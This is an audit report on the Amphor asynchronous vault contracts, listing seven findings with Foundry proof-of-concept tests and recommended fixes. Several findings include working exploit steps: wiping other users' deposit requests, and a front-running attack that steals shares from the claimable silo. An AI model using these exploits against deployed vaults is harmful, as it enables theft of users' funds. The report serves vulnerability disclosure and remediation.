# Issue H-1: Claiming a deposit in the same Epoch in which the deposit was requested will lead to loss of funds 

Source: https://github.com/sherlock-audit/2024-03-amphor-judging/issues/70 

## Found by 
CryptoSan, cawfree, eeshenggoh, kennedy1030, pynschon, sammy, whitehair0330, zzykxx
## Summary
A user who has made a deposit request using the [`requestDeposit`](https://github.com/AmphorProtocol/asynchronous-vault/blob/c4f7a9b8f3d3d9aba0e43eaae38ef9b556023b0e/src/AsyncSynthVault.sol#L439) function will forfeit their entire balance if they attempt to claim the deposit using the [`claimDeposit`](https://github.com/AmphorProtocol/asynchronous-vault/blob/c4f7a9b8f3d3d9aba0e43eaae38ef9b556023b0e/src/AsyncSynthVault.sol#L508) function within the same Epoch.

## Vulnerability Detail
Within the `AsyncSynthVault` in its closed state, users can initiate a deposit through the [`requestDeposit`](https://github.com/AmphorProtocol/asynchronous-vault/blob/c4f7a9b8f3d3d9aba0e43eaae38ef9b556023b0e/src/AsyncSynthVault.sol#L439) function. Subsequently, they would use the [`claimDeposit`](https://github.com/AmphorProtocol/asynchronous-vault/blob/c4f7a9b8f3d3d9aba0e43eaae38ef9b556023b0e/src/AsyncSynthVault.sol#L508) function to claim vault shares. However, executing this claim within the same Epoch as the deposit request results in the total loss of the user's balance.

The issue unfolds as follows:
1. The user invokes the [`requestDeposit`](https://github.com/AmphorProtocol/asynchronous-vault/blob/c4f7a9b8f3d3d9aba0e43eaae38ef9b556023b0e/src/AsyncSynthVault.sol#L439) function, transferring a specified amount of tokens (`assets`) to the vault. This triggers the [`_createDepositRequest`](https://github.com/sherlock-audit/2024-03-amphor/blob/main/asynchronous-vault/src/AsyncSynthVault.sol#L698) function, which increases `epochs[epochId].depositRequestBalance[receiver]` by the `assets` amount.
2. Subsequently, the user calls the [`claimDeposit`](https://github.com/AmphorProtocol/asynchronous-vault/blob/c4f7a9b8f3d3d9aba0e43eaae38ef9b556023b0e/src/AsyncSynthVault.sol#L508) function. This action invokes the [`_claimDeposit`](https://github.com/AmphorProtocol/asynchronous-vault/blob/c4f7a9b8f3d3d9aba0e43eaae38ef9b556023b0e/src/AsyncSynthVault.sol#L742) internal function, setting `epochs[lastRequestId].depositRequestBalance[receiver]` to 0, where `lastRequestId` is equal to `epochId`. However, the user is not credited with any shares, as `previewClaimDeposit` yields 0.


Proof of Code :

The following test demonstrates the claim made above : 
```solidity
function test_poc() external {
        
        // set token balances
        deal(vaultTested.asset(), user1.addr, 20);
        deal(vaultTested.asset(), user2.addr, type(uint256).max); 
        
        // initial deposit when vault is open
        vm.startPrank(user2.addr);
        IERC20Metadata(vaultTested.asset()).approve(address(vaultTested), 10);
        vaultTested.deposit(10, user2.addr);
        vm.stopPrank();
        
        // owner closes the vault 
        vm.prank(vaultTested.owner());
        vaultTested.close();

        vm.startPrank(user1.addr);
        IERC20Metadata(vaultTested.asset()).approve(address(vaultTested), 20);
        // user1 requests a deposit
        vaultTested.requestDeposit(20, user1.addr, user1.addr,  "");
        assertEq(vaultTested.pendingDepositRequest(user1.addr),20); // check pending deposit
        // user1 claims the deposit
        vaultTested.claimDeposit(user1.addr);
        // user1 checks the pending deposit request amount
        assertEq(vaultTested.pendingDepositRequest(user1.addr),0);
        // user1 checks shares balance
        assertEq(vaultTested.balanceOf(user1.addr), 0);
       // user1 checks tokens balance
        assertEq(IERC20Metadata(vaultTested.asset()).balanceOf(user1.addr), 0); 

        vm.stopPrank();

        // all three are zero, indicating loss of funds

    }
```
To run the test : 
1. Copy the above code and paste it into `TestClaimDeposit.t.sol`
2. Run `forge test --match-test test_poc --ffi`

## Impact
The user loses both their initial deposit of tokens and the vault shares that they were entitled to receive.

## Code Snippet

## Tool used
Manual Review
Foundry

## Recommendation
Revert [`claimDeposit`](https://github.com/AmphorProtocol/asynchronous-vault/blob/c4f7a9b8f3d3d9aba0e43eaae38ef9b556023b0e/src/AsyncSynthVault.sol#L508) if `lastRequestId == epochId`



## Discussion

**sherlock-admin3**

1 comment(s) were left on this issue during the judging contest.

**takarez** commented:
>  valid; high(1)



**sherlock-admin4**

The protocol team fixed this issue in PR/commit https://github.com/AmphorProtocol/asynchronous-vault/pull/103.

# Issue H-2: Claim functions don't validate if the epoch is settled 

Source: https://github.com/sherlock-audit/2024-03-amphor-judging/issues/72 

## Found by 
CryptoSan, aslanbek, fugazzi, i3arba, jennifer37, kennedy1030, mahdikarimi, sammy, turvec, whitehair0330
## Summary

Both claim functions fail to validate if the epoch for the request has been already settled, leading to loss of funds when claiming requests for the current epoch. The issue is worsened as `claimAndRequestDeposit()` can be used to claim a deposit on behalf of any account, allowing an attacker to wipe other's requests.

## Vulnerability Detail

When the vault is closed, users can request a deposit, transfer assets and later claim shares, or request a redemption, transfer shares and later redeem assets. Both of these processes store the assets or shares, and later convert these when the epoch is settled. For deposits, the core of the implementation is given by `_claimDeposit()`:

```solidity
function _claimDeposit(
    address owner,
    address receiver
)
    internal
    returns (uint256 shares)
{
    shares = previewClaimDeposit(owner);

    uint256 lastRequestId = lastDepositRequestId[owner];
    uint256 assets = epochs[lastRequestId].depositRequestBalance[owner];
    epochs[lastRequestId].depositRequestBalance[owner] = 0;
    _update(address(claimableSilo), receiver, shares);
    emit ClaimDeposit(lastRequestId, owner, receiver, assets, shares);
}

function previewClaimDeposit(address owner) public view returns (uint256) {
    uint256 lastRequestId = lastDepositRequestId[owner];
    uint256 assets = epochs[lastRequestId].depositRequestBalance[owner];
    return _convertToShares(assets, lastRequestId, Math.Rounding.Floor);
}

function _convertToShares(
    uint256 assets,
    uint256 requestId,
    Math.Rounding rounding
)
    internal
    view
    returns (uint256)
{
    if (isCurrentEpoch(requestId)) {
        return 0;
    }
    uint256 totalAssets =
        epochs[requestId].totalAssetsSnapshotForDeposit + 1;
    uint256 totalSupply =
        epochs[requestId].totalSupplySnapshotForDeposit + 1;

    return assets.mulDiv(totalSupply, totalAssets, rounding);
}
```

And for redemptions in `_claimRedeem()`:

```solidity
function _claimRedeem(
    address owner,
    address receiver
)
    internal
    whenNotPaused
    returns (uint256 assets)
{
    assets = previewClaimRedeem(owner);
    uint256 lastRequestId = lastRedeemRequestId[owner];
    uint256 shares = epochs[lastRequestId].redeemRequestBalance[owner];
    epochs[lastRequestId].redeemRequestBalance[owner] = 0;
    _asset.safeTransferFrom(address(claimableSilo), address(this), assets);
    _asset.transfer(receiver, assets);
    emit ClaimRedeem(lastRequestId, owner, receiver, assets, shares);
}

function previewClaimRedeem(address owner) public view returns (uint256) {
    uint256 lastRequestId = lastRedeemRequestId[owner];
    uint256 shares = epochs[lastRequestId].redeemRequestBalance[owner];
    return _convertToAssets(shares, lastRequestId, Math.Rounding.Floor);
}

function _convertToAssets(
    uint256 shares,
    uint256 requestId,
    Math.Rounding rounding
)
    internal
    view
    returns (uint256)
{
    if (isCurrentEpoch(requestId)) {
        return 0;
    }
    uint256 totalAssets = epochs[requestId].totalAssetsSnapshotForRedeem + 1;
    uint256 totalSupply = epochs[requestId].totalSupplySnapshotForRedeem + 1;

    return shares.mulDiv(totalAssets, totalSupply, rounding);
}
```

Note that in both cases the "preview" functions are used to convert and calculate the amounts owed to the user: `_convertToShares()` and `_convertToAssets()` use the settled values stored in `epochs[requestId]` to convert between assets and shares.

However, there is no validation to check if the claiming is done for the current unsettled epoch. If a user claims a deposit or redemption during the same epoch it has been requested, the values stored in `epochs[epochId]` will be uninitialized, which means that `_convertToShares()` and `_convertToAssets()` will use zero values leading to zero results too. The claiming process will succeed, but since the converted amounts are zero, the users will always get zero assets or shares.

This is even worsened by the fact that `claimAndRequestDeposit()` can be used to claim a deposit on behalf of any account. An attacker can wipe any requested deposit from an arbitrary `account` by simply calling `claimAndRequestDeposit(0, account, "")`. This will internally execute `_claimDeposit(account, account)`, which will trigger the described issue.

## Proof of concept

The following proof of concept demonstrates the scenario in which a user claims their own deposit during the current epoch:

```solidity
function test_ClaimSameEpochLossOfFunds_Scenario_A() public {
    asset.mint(alice, 1_000e18);

    vm.prank(alice);
    vault.deposit(500e18, alice);

    // vault is closed
    vm.prank(owner);
    vault.close();

    // alice requests a deposit
    vm.prank(alice);
    vault.requestDeposit(500e18, alice, alice, "");

    // the request is successfully created
    assertEq(vault.pendingDepositRequest(alice), 500e18);

    // now alice claims the deposit while vault is still open
    vm.prank(alice);
    vault.claimDeposit(alice);

    // request is gone
    assertEq(vault.pendingDepositRequest(alice), 0);
}
```

This other proof of concept illustrates the scenario in which an attacker calls `claimAndRequestDeposit()` to wipe the deposit of another account.

```solidity
function test_ClaimSameEpochLossOfFunds_Scenario_B() public {
    asset.mint(alice, 1_000e18);

    vm.prank(alice);
    vault.deposit(500e18, alice);

    // vault is closed
    vm.prank(owner);
    vault.close();

    // alice requests a deposit
    vm.prank(alice);
    vault.requestDeposit(500e18, alice, alice, "");

    // the request is successfully created
    assertEq(vault.pendingDepositRequest(alice), 500e18);

    // bob can issue a claim for alice through claimAndRequestDeposit()
    vm.prank(bob);
    vault.claimAndRequestDeposit(0, alice, "");

    // request is gone
    assertEq(vault.pendingDepositRequest(alice), 0);
}
```

## Impact

CRITICAL. Requests can be wiped by executing the claim in an unsettled epoch, leading to loss of funds. The issue can also be triggered for any arbitrary account by using `claimAndRequestDeposit()`.

## Code Snippet

https://github.com/sherlock-audit/2024-03-amphor/blob/main/asynchronous-vault/src/AsyncSynthVault.sol#L742-L756

https://github.com/sherlock-audit/2024-03-amphor/blob/main/asynchronous-vault/src/AsyncSynthVault.sol#L758-L773

## Tool used

Manual Review

## Recommendation

Check that the epoch associated with the request is not the current epoch.

```diff
    function _claimDeposit(
        address owner,
        address receiver
    )
        internal
        returns (uint256 shares)
    {
+       uint256 lastRequestId = lastDepositRequestId[owner];
+       if (isCurrentEpoch(lastRequestId)) revert();
      
        shares = previewClaimDeposit(owner);

-       uint256 lastRequestId = lastDepositRequestId[owner];
        uint256 assets = epochs[lastRequestId].depositRequestBalance[owner];
        epochs[lastRequestId].depositRequestBalance[owner] = 0;
        _update(address(claimableSilo), receiver, shares);
        emit ClaimDeposit(lastRequestId, owner, receiver, assets, shares);
    }
```

```diff
    function _claimRedeem(
        address owner,
        address receiver
    )
        internal
        whenNotPaused
        returns (uint256 assets)
    {
+       uint256 lastRequestId = lastRedeemRequestId[owner];
+       if (isCurrentEpoch(lastRequestId)) revert();
        
        assets = previewClaimRedeem(owner);
-       uint256 lastRequestId = lastRedeemRequestId[owner];
        uint256 shares = epochs[lastRequestId].redeemRequestBalance[owner];
        epochs[lastRequestId].redeemRequestBalance[owner] = 0;
        _asset.safeTransferFrom(address(claimableSilo), address(this), assets);
        _asset.transfer(receiver, assets);
        emit ClaimRedeem(lastRequestId, owner, receiver, assets, shares);
    }
```



## Discussion

**sherlock-admin4**

1 comment(s) were left on this issue during the judging contest.

**takarez** commented:
>  valid; high(1)



**sherlock-admin4**

The protocol team fixed this issue in PR/commit https://github.com/AmphorProtocol/asynchronous-vault/pull/103.

# Issue H-3: Calling `requestRedeem` with `_msgSender() != owner`  will lead to user's shares being locked in the vault forever 

Source: https://github.com/sherlock-audit/2024-03-amphor-judging/issues/85 

## Found by 
Afriaudit, DMoore, Varun\_05, den\_sosnovskyi, fugazzi, sammy, zzykxx
## Summary
The [`requestRedeem`](https://github.com/sherlock-audit/2024-03-amphor/blob/main/asynchronous-vault/src/AsyncSynthVault.sol#L477) function in `AsyncSynthVault.sol` can be invoked by a user on behalf of another user, referred to as 'owner', provided that the user has been granted sufficient allowance by the 'owner'. However, this action results in a complete loss of balance.


## Vulnerability Detail
The [`_createRedeemRequest`](https://github.com/sherlock-audit/2024-03-amphor/blob/main/asynchronous-vault/src/AsyncSynthVault.sol#L721) function contains a discrepancy; it fails to update the `lastRedeemRequestId` for the user eligible to claim the shares upon maturity. Instead, it updates this identifier for the 'owner' who delegated their shares to the user. As a result, the shares become permanently locked in the vault, rendering them unclaimable by either the 'owner' or the user.

This issue unfolds as follows:

1. The 'owner' deposits tokens into the vault, receiving vault shares in return.
2. The 'owner' then delegates the allowance of all their vault shares to another user.
3. When `epochId == 1`, this user executes The [`requestRedeem`](https://github.com/sherlock-audit/2024-03-amphor/blob/main/asynchronous-vault/src/AsyncSynthVault.sol#L477) , specifying the 'owner''s address as `owner`, the user's address as `receiver`, and the 'owner''s share balance as `shares`.
4. The internal function `_createRedeemRequest` is invoked, incrementing `epochs[epochId].redeemRequestBalance[receiver]` by the amount of `shares`, and setting `lastRedeemRequestId[owner] = epochId`.
5. At `epochId == 2`, the user calls [`claimRedeem`](https://github.com/sherlock-audit/2024-03-amphor/blob/main/asynchronous-vault/src/AsyncSynthVault.sol#L521), which in turn calls the internal function [`_claimRedeem`](https://github.com/sherlock-audit/2024-03-amphor/blob/main/asynchronous-vault/src/AsyncSynthVault.sol#L758), with `owner` set to `_msgSender()` (i.e., the user's address) and `receiver` also set to the user's address.
6. In this scenario, `lastRequestId` remains zero because `lastRedeemRequestId[owner] == 0` (here, `owner` refers to the user's address). Consequently, `epochs[lastRequestId].redeemRequestBalance[owner]` is also zero. Therefore, no shares are minted to the user.


Proof of Code : 

The following test demonstrates the claim made above : 

```solidity
function test_poc() external {
        // set token balances
        deal(vaultTested.asset(), user1.addr, 20); // owner

        vm.startPrank(user1.addr);
        IERC20Metadata(vaultTested.asset()).approve(address(vaultTested), 20);
        // owner deposits tokens when vault is open and receives vault shares
        vaultTested.deposit(20, user1.addr);
        // owner delegates shares balance to user
        IERC20Metadata(address(vaultTested)).approve(
            user2.addr,
            vaultTested.balanceOf(user1.addr)
        );
        vm.stopPrank();

        // vault is closed
        vm.prank(vaultTested.owner());
        vaultTested.close();

        // epoch = 1
        vm.startPrank(user2.addr);
        // user requests a redeem on behlaf of owner
        vaultTested.requestRedeem(
            vaultTested.balanceOf(user1.addr),
            user2.addr,
            user1.addr,
            ""
        );
        // user checks the pending redeem request amount
        assertEq(vaultTested.pendingRedeemRequest(user2.addr), 20);
        vm.stopPrank();

        vm.startPrank(vaultTested.owner());
        IERC20Metadata(vaultTested.asset()).approve(
            address(vaultTested),
            type(uint256).max
        );
        vaultTested.settle(23); // an epoch goes by
        vm.stopPrank();

        // epoch = 2

        vm.startPrank(user2.addr);
        // user tries to claim the redeem
        vaultTested.claimRedeem(user2.addr);
        assertEq(IERC20Metadata(vaultTested.asset()).balanceOf(user2.addr), 0);
        // however, token balance of user is still empty
        vm.stopPrank();

        vm.startPrank(user1.addr);
        // owner also tries to claim the redeem
        vaultTested.claimRedeem(user1.addr);
        assertEq(IERC20Metadata(vaultTested.asset()).balanceOf(user1.addr), 0);
        // however, token balance of owner is still empty
        vm.stopPrank();

        // all the balances of owner and user are zero, indicating loss of funds
        assertEq(vaultTested.balanceOf(user1.addr), 0);
        assertEq(IERC20Metadata(vaultTested.asset()).balanceOf(user1.addr), 0);
        assertEq(vaultTested.balanceOf(user2.addr), 0);
        assertEq(IERC20Metadata(vaultTested.asset()).balanceOf(user2.addr), 0);
    }
```
To run the test : 
1. Copy the above code and paste it into `TestClaimDeposit.t.sol`
2. Run `forge test --match-test test_poc --ffi`

## Impact
The shares are locked in the vault forever with no method for recovery by the user or the 'owner'. 

## Code Snippet

## Tool used

Manual Review
Foundry

## Recommendation
Modify [`_createRedeemRequest`](https://github.com/sherlock-audit/2024-03-amphor/blob/main/asynchronous-vault/src/AsyncSynthVault.sol#L721) as follows : 
```diff
-        lastRedeemRequestId[owner] = epochId;
+       lastRedeemRequestid[receiver] = epochId;

```



## Discussion

**sherlock-admin3**

1 comment(s) were left on this issue during the judging contest.

**takarez** commented:
>  invalid



**sherlock-admin4**

The protocol team fixed this issue in PR/commit https://github.com/AmphorProtocol/asynchronous-vault/pull/103.

# Issue H-4: Exchange rate is calculated incorrectly when the vault is closed, potentially leading to funds being stolen 

Source: https://github.com/sherlock-audit/2024-03-amphor-judging/issues/131 

## Found by 
Darinrikusham, fugazzi, whitehair0330, zzykxx
## Summary
The exchange ratio between shares and assets is calculated incorrectly when the vault is closed. This can cause accounting inconsistencies, funds being stolen and users being unable to redeem shares.

## Vulnerability Detail
The functions [AsyncSynthVault::_convertToAssets](https://github.com/sherlock-audit/2024-03-amphor/blob/main/asynchronous-vault/src/AsyncSynthVault.sol#L907-L908) and [AsyncSynthVault::_convertToShares](https://github.com/sherlock-audit/2024-03-amphor/blob/main/asynchronous-vault/src/AsyncSynthVault.sol#L887-L890) both add `1` to the epoch cached variables `totalAssetsSnapshotForDeposit`, `totalSupplySnapshotForDeposit`, `totalAssetsSnapshotForRedeem` and `totalSupplySnapshotForRedeem`. 

This is incorrect because the function [previewSettle](https://github.com/sherlock-audit/2024-03-amphor/blob/main/asynchronous-vault/src/AsyncSynthVault.sol#L626), used in [_settle()](https://github.com/sherlock-audit/2024-03-amphor/blob/main/asynchronous-vault/src/AsyncSynthVault.sol#L786), already adds `1` to the variables:
```solidity
...
uint256 totalAssetsSnapshotForDeposit = _lastSavedBalance + 1;
uint256 totalSupplySnapshotForDeposit = totalSupply + 1;
...
uint256 totalAssetsSnapshotForRedeem = _lastSavedBalance + pendingDeposit + 1;
uint256 totalSupplySnapshotForRedeem = totalSupply + sharesToMint + 1;
...
```

This leads to accounting inconsistencies between depositing/redeeming when a vault is closed and depositing/redeeming when a vault is open whenever the exchange ratio assets/shares is not exactly 1:1.

If a share is worth more than one asset:
- Users that will request a deposit while the vault is closed will receive **more** shares than they should
- Users that will request a redeem while the vault is closed will receive **less** assets than they should

### POC
This can be taken advantage of by an attacker by doing the following:
1. The attacker monitors the mempool for a vault deployment.
2. Before the vault is deployed the attacker transfers to the vault some of the vault underlying asset (donation). This increases the value of one share.
3. The protocol team initializes the vault and adds the bootstrap liquidity.
4. Users use the protocol normally and deposits some assets.
5. The vault gets closed by the protocol team and the funds invested.
6. Some users request a deposit while the vault is closed.
7. The attacker monitors the mempool to know when the vault will be open again.
8. Right before the vault is opened, the attacker performs multiple deposit requests with different accounts. For each account he deposits the minimum amount of assets required to receive 1 share.
9. The vault opens.
10. The attacker claims all of the deposits with every account and then redeems the shares immediately for profit.

This will "steal" shares of other users (point `6`) from the claimable silo because the protocol will give the attacker more shares than it should. The attacker will profit and some users won't be able to claim their shares.

Add imports to `TestClaimRedeem.t.sol`:
```solidity
import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
```
and copy-paste:
```solidity
function test_attackerProfitsViaRequestingDeposits() external {
    address attacker = makeAddr("attacker");
    address protocolUsers = makeAddr("alice");
    address vaultOwner = vaultTested.owner();

    uint256 donation = 1e18 - 1;
    uint256 protocolUsersDeposit = 10e18 + 15e18;
    uint256 protocolTeamBootstrapDeposit = 1e18;

    IERC20 asset = IERC20(vaultTested.asset());
    deal(address(asset), protocolUsers, protocolUsersDeposit);
    deal(address(asset), attacker, donation);
    deal(address(asset), vaultOwner, protocolTeamBootstrapDeposit);

    vm.prank(vaultOwner);
    asset.approve(address(vaultTested), type(uint256).max);

    vm.prank(protocolUsers);
    asset.approve(address(vaultTested), type(uint256).max);

    vm.prank(attacker);
    asset.approve(address(vaultTested), type(uint256).max);

    //-> Attacker donates `1e18 - 1` assets, this can be done before the vault is even deployed
    vm.prank(attacker);
    asset.transfer(address(vaultTested), donation);

    //-> Protocol team bootstraps the vault with `1e18` of assets
    vm.prank(vaultOwner);
    vaultTested.deposit(protocolTeamBootstrapDeposit, vaultOwner);
    
    //-> Users deposit `10e18` of liquidity in the vault
    vm.prank(protocolUsers);
    vaultTested.deposit(10e18, protocolUsers);

    //-> Vault gets closed
    vm.prank(vaultOwner);
    vaultTested.close();

    //-> Users request deposits for `15e18` assets
    vm.prank(protocolUsers);
    vaultTested.requestDeposit(15e18, protocolUsers, protocolUsers, "");

    //-> The attacker frontruns the call to `open()` and knows that:
    //- The current epoch cached `totalSupply` of shares will be `vaultTested.totalSupply()` + 1 + 1
    //- The current epoch cached `totalAssets` will be 12e18 + 1 + 1
    uint256 totalSupplyCachedOnOpen = vaultTested.totalSupply() + 1 + 1; //Current supply of shares, plus 1 used as virtual share, plus 1 added by `_convertToAssets`
    uint256 totalAssetsCachedOnOpen = vaultTested.lastSavedBalance() + 1 + 1; //Total assets passed as paremeter to `open`, plus 1 used as virtual share, plus 1 added by `_convertToAssets`
    uint256 minToDepositToGetOneShare = totalAssetsCachedOnOpen / totalSupplyCachedOnOpen;

    //-> Attacker frontruns the call to `open()` by requesting a deposit with multiple fresh accounts
    uint256 totalDeposited = 0;
    for(uint256 i = 0; i < 30; i++) {
        address attackerEOA = address(uint160(i * 31000 + 49*49)); //Random address that does not conflict with existing ones
        deal(address(asset), attackerEOA, minToDepositToGetOneShare);
        vm.startPrank(attackerEOA);
        asset.approve(address(vaultTested), type(uint256).max);
        vaultTested.requestDeposit(minToDepositToGetOneShare, attackerEOA, attackerEOA, "");
        vm.stopPrank();
        totalDeposited += minToDepositToGetOneShare;
    }

    //->Vault gets opened again with 0 profit and 0 losses (for simplicity)
    vm.startPrank(vaultOwner);
    vaultTested.open(vaultTested.lastSavedBalance());
    vm.stopPrank();

    //-> Attacker claims his deposits and withdraws them immediately for profit
    uint256 totalRedeemed = 0;
    for(uint256 i = 0; i < 30; i++) {
        address attackerEOA = address(uint160(i * 31000 + 49*49)); //Random address that does not conflict with existing ones
        vm.startPrank(attackerEOA);
        vaultTested.claimDeposit(attackerEOA);
        uint256 assets = vaultTested.redeem(vaultTested.balanceOf(attackerEOA), attackerEOA, attackerEOA);
        vm.stopPrank();
        totalRedeemed += assets;
    }

    //->❌ Attacker is in profit
    assertGt(totalRedeemed, totalDeposited + donation);
}
```

## Impact
When the ratio between shares and assets is not 1:1 the protocol calculates the exchange rate between assets and shares inconsitently. This is an issue by itself and can lead to loss of funds and users not being able to claim shares. It can also be taken advantage of by an attacker to steal shares from the claimable silo.

Note that the "donation" done initially is not akin to an "inflation" attack because the attacker is not required to mint any share.

## Code Snippet

## Tool used

Manual Review

## Recommendation
In the functions [AsyncSynthVault::_convertToAssets](https://github.com/sherlock-audit/2024-03-amphor/blob/main/asynchronous-vault/src/AsyncSynthVault.sol#L907-L908) and [AsyncSynthVault::_convertToShares](https://github.com/sherlock-audit/2024-03-amphor/blob/main/asynchronous-vault/src/AsyncSynthVault.sol#L887-L890):
- Return `0` if `requestId == 0`
- Don't add `1` to the two cached variables

It's also a good idea to perform the initial bootstrapping deposit in the [initialize](https://github.com/sherlock-audit/2024-03-amphor/blob/main/asynchronous-vault/src/AsyncSynthVault.sol#L181) function (as suggested in another finding) and require that the vault contains `0` assets when the first deposit is performed.



## Discussion

**sherlock-admin4**

The protocol team fixed this issue in PR/commit https://github.com/AmphorProtocol/asynchronous-vault/pull/104.

# Issue M-1: The `_zapIn` function may unexpectedly revert due to the incorrect implementation of `_transferTokenInAndApprove` 

Source: https://github.com/sherlock-audit/2024-03-amphor-judging/issues/1 

## Found by 
0xLogos, Krace, Tricko, Varun\_05, aslanbek, cawfree, den\_sosnovskyi, merlin, n1punp, nine9, no, whitehair0330, zzykxx
## Summary

The `_transferTokenInAndApprove` function should approve the `router` on behalf of the *VaultZapper* contract. However, it checks the allowance from `msgSender` to the `router`, rather than the *VaultZapper*. This potentially results in the *VaultZapper* not approving the `router` and causing unexpected reverting.

## Vulnerability Detail

The allowance check in the `_transferTokenInAndApprove` function should verify that `address(this)` has approved sufficient amount of `tokenIn` to the `router`. However, it currently checks the allowance of `_msgSender()`, which is unnecessary and may cause transaction reverting if `_msgSender` had previously approved the `router`.

```solidity
    function _transferTokenInAndApprove(
        address router,
        IERC20 tokenIn,
        uint256 amount
    )
        internal
    {
        tokenIn.safeTransferFrom(_msgSender(), address(this), amount);
//@ The check of allowance is useless, we should check the allowance from address(this) rather than the msgSender
        if (tokenIn.allowance(_msgSender(), router) < amount) {
            tokenIn.forceApprove(router, amount);
        }
    }
```


**POC**

Apply the patch to `asynchronous-vault/test/Zapper/ZapperDeposit.t.sol` to add the test case and run it with `forge test --match-test test_zapIn --ffi`.

```diff
diff --git a/asynchronous-vault/test/Zapper/ZapperDeposit.t.sol b/asynchronous-vault/test/Zapper/ZapperDeposit.t.sol
index 9083127..ff11b56 100644
--- a/asynchronous-vault/test/Zapper/ZapperDeposit.t.sol
+++ b/asynchronous-vault/test/Zapper/ZapperDeposit.t.sol
@@ -17,6 +17,25 @@ contract VaultZapperDeposit is OffChainCalls {
         zapper = new VaultZapper();
     }

+    function test_zapIn() public {
+        Swap memory params =
+            Swap(_router, _USDC, _WSTETH, 1500 * 1e6, 1, address(0), 20);
+        _setUpVaultAndZapper(_WSTETH);
+
+        IERC4626 vault = _vault;
+        bytes memory swapData =
+            _getSwapData(address(zapper), address(zapper), params);
+
+        _getTokenIn(params);
+
+        // If the msgSender() happend to approve the SwapRouter before, then the zap will always revert
+        IERC20(params.tokenIn).approve(address(params.router), params.amount);
+        zapper.zapAndDeposit(
+            params.tokenIn, vault, params.router, params.amount, swapData
+        );
+
+    }
+
     //// test_zapAndDeposit ////
     function test_zapAndDepositUsdcWSTETH() public {
         Swap memory usdcToWstEth =
```

Result:
```javascript
Ran 1 test for test/Zapper/ZapperDeposit.t.sol:VaultZapperDeposit
[FAIL. Reason: SwapFailed("\u{8}�y�\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0 \0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0(ERC20: transfer amount exceeds allowance\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0")] test_zapIn() (gas: 4948462)
Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 20.84s (18.74s CPU time)

Ran 1 test suite in 22.40s (20.84s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/Zapper/ZapperDeposit.t.sol:VaultZapperDeposit
[FAIL. Reason: SwapFailed("\u{8}�y�\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0 \0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0(ERC20: transfer amount exceeds allowance\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0")] test_zapIn() (gas: 4948462)
```

## Impact

This issue could lead to transaction reverting when users interact with the contract normally, thereby affecting the contract's regular functionality.

## Code Snippet

https://github.com/sherlock-audit/2024-03-amphor/blob/6c797025ffe296e04607abf74400ff2bb36a7de3/asynchronous-vault/src/VaultZapper.sol#L160-L171

## Tool used

Foundry

## Recommendation

Fix the issue:
```diff
diff --git a/asynchronous-vault/src/VaultZapper.sol b/asynchronous-vault/src/VaultZapper.sol
index 9943535..9cf6df9 100644
--- a/asynchronous-vault/src/VaultZapper.sol
+++ b/asynchronous-vault/src/VaultZapper.sol
@@ -165,7 +165,7 @@ contract VaultZapper is Ownable2Step, Pausable {
         internal
     {
         tokenIn.safeTransferFrom(_msgSender(), address(this), amount);
-        if (tokenIn.allowance(_msgSender(), router) < amount) {
+        if (tokenIn.allowance(address(this), router) < amount) {
             tokenIn.forceApprove(router, amount);
         }
     }
```



## Discussion

**sherlock-admin2**

1 comment(s) were left on this issue during the judging contest.

**takarez** commented:
>  seem valid; medium(3)



**sherlock-admin4**

The protocol team fixed this issue in PR/commit https://github.com/AmphorProtocol/asynchronous-vault/pull/103.

# Issue M-2: Vaults are not boostrapped atomically 

Source: https://github.com/sherlock-audit/2024-03-amphor-judging/issues/50 

## Found by 
Arabadzhiev, zzykxx
## Summary

## Vulnerability Detail
The protocol team mentioned that vaults will be bootstrapped with initial liquidity to prevent inflation attacks. To effectively prevent an inflation attack the funds should be deposited in the vault atomically during [initialization](https://github.com/sherlock-audit/2024-03-amphor/blob/main/asynchronous-vault/src/AsyncSynthVault.sol#L181), but this doesn't happen, opening up the possibility of an inflation attack on the bootstrapping transaction itself.

## Impact
The protocol team could fall victim to an inflation attack on their first deposit.

## Code Snippet

## Tool used

Manual Review

## Recommendation
Make the first deposit in the vault during the [initialization](https://github.com/sherlock-audit/2024-03-amphor/blob/main/asynchronous-vault/src/AsyncSynthVault.sol#L181) call, this way the first deposit can't be front-run.



## Discussion

**sherlock-admin4**

1 comment(s) were left on this issue during the judging contest.

**WangAudit** commented:
> invalid; I see what it means; but imo it's not H/M



**sherlock-admin4**

The protocol team fixed this issue in PR/commit https://github.com/AmphorProtocol/asynchronous-vault/pull/103.

# Issue M-3: IERC20.transfer wil fail for USDT 

Source: https://github.com/sherlock-audit/2024-03-amphor-judging/issues/126 

## Found by 
0xKartikgiri00, 0xLogos, 0xShitgem, offside0011, rekxor
## Summary

Some tokens do not return bool on transfer, e.g. USDT on mainnet

## Vulnerability Detail

USDT on mainnet do not return bool on transfer: https://etherscan.io/address/0xdac17f958d2ee523a2206206994597c13d831ec7#code#L126

But but because of IERC20 interface solidity will try to parse bool from nothing thus reverting.

## Impact

Unable to claim requested redeem if underlying asset is USDT

## Code Snippet

https://github.com/sherlock-audit/2024-03-amphor/blob/6c797025ffe296e04607abf74400ff2bb36a7de3/asynchronous-vault/src/AsyncSynthVault.sol#L771

## Tool used

Manual Review

## Recommendation

Instead transfer directly to `receiver`

```diff
_asset.safeTransferFrom(address(claimableSilo), receiver, assets);
- _asset.transfer(receiver, assets);
```



## Discussion

**sherlock-admin4**

The protocol team fixed this issue in PR/commit https://github.com/AmphorProtocol/asynchronous-vault/pull/103.

